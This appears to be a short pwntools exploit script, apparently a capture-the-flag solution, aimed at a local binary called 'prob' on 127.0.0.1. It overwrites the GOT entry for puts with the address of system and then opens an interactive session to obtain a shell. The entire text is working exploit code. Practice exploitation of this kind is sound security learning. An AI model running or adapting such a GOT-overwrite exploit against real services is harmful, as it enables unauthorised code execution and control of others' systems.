from pwn import *

context.log_level = 'debug'

p = remote("127.0.0.1", 26146)
#p = process("./prob")
e = ELF("./prob")

p.sendlineafter(" > ", p64(e.got['puts']))
p.sendlineafter(" > ", p64(e.sym['system']))

p.interactive()
